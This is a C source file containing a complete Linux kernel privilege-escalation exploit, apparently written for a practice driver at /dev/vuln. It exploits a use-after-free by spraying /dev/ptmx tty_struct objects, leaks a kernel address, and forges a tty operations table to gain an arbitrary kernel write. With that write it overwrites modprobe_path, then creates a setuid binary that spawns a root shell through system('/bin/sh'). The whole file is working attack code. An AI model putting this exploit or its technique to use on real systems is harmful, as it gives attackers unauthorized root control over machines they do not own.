#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/ioctl.h>
#include <linux/tty.h>
#include <sys/ioctl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>

#define K1_TYPE 0xB9
#define SPRAY_SIZE 1000

#define ALLOC _IOW(K1_TYPE, 0, size_t)
#define FREE _IO(K1_TYPE, 1)
#define USE_READ _IOR(K1_TYPE, 2, char)
#define USE_WRITE _IOW(K1_TYPE, 2, char)

int fd;
char* buf_ptr;
uint64_t ptm_unix98_ops;

void prepare() {
    fd = open("/dev/vuln", O_RDONLY, 0);
    size_t size = 1024; // we will spray tty_struct
    ioctl(fd, ALLOC, &size);
    ioctl(fd, FREE);
}

bool check() {
    char buf[1024];
    ioctl(fd, USE_READ, buf);
    void* address = *(void**)(&buf[32]);
    if ((unsigned long)address >= 0xffffffff00000000) {
        return true;
    }
}

// returns fd of successful /dev/ptmx open call
int spray() {
    int spray_fds[SPRAY_SIZE];
    for (int i = 0; i < SPRAY_SIZE; i++) {
        spray_fds[i] = open("/dev/ptmx", O_RDONLY);
        if (spray_fds[i] == -1) {
            perror(NULL);
            for (int j = 0; j < i; j++) {
                close(spray_fds[j]);
            }
            return -1;
        }
        if (check()) {
            for (int j = 0; j < i; j++) {
                close(spray_fds[j]);
            }
            return spray_fds[i];
        }
    }
}

void* leak() {
    char buf[1024];
    ioctl(fd, USE_READ, buf);
    buf_ptr = *(void**)(&buf[64]) - 0x40; // this is very sus and may not hold up with kaslr/different kernel versions
    printf("buf ptr: %p\n", buf_ptr);
    return *(void**)(&buf[32]);
}

int mem_write(int ptmx_fd, uint64_t* address, uint32_t value) {
    void* buf[1024 / 8];

    void** fake_ops_table = &buf[100];

    for (int i = 0; i < 20; i++) {
        fake_ops_table[i] = (void*)(((long)0xffffffff813cdc0b - (long)0xffffffff82285100) + ptm_unix98_ops); // mov dword ptr [rdx],ecx; ret;
    }


    buf[4] = buf_ptr + 100 * 8;
    ioctl(fd, USE_WRITE, buf);
    int ret = ioctl(ptmx_fd, value, address);
    printf("ioctl returned %d\n", ret);
}

int main(int argc, char** argv) {

    if (argc > 1) {
        // we need to spawn a shell
        setuid(0);
        setgid(0);
        system("/bin/sh");
        return 0;
    }

    prepare();
    int ptmx_fd = spray();
    ptm_unix98_ops = (uint64_t)leak();

    printf("leak: %lx\n", ptm_unix98_ops);

    char fake_modprobe[] = "/tmp/mp\0";
    void* modprobe_path = (void*)((long)0xffffffff82b3f600 - (long)0xffffffff82285100 + ptm_unix98_ops);

    mem_write(ptmx_fd, modprobe_path, *(uint32_t*)(&fake_modprobe[0]));
    mem_write(ptmx_fd, modprobe_path + 4, *(uint32_t*)(&fake_modprobe[4]));

    system("echo -e \"#!/bin/sh\nchown 0:0 /tmp/exploit\nchmod 4777 /tmp/exploit\" > /tmp/mp");
    system("chmod +x /tmp/mp");

    system("echo -e '\xff\xff\xff\xff' > /tmp/a");
    system("chmod +x /tmp/a");

    system("/tmp/a");
    system("/tmp/exploit a");

    return 0;
}
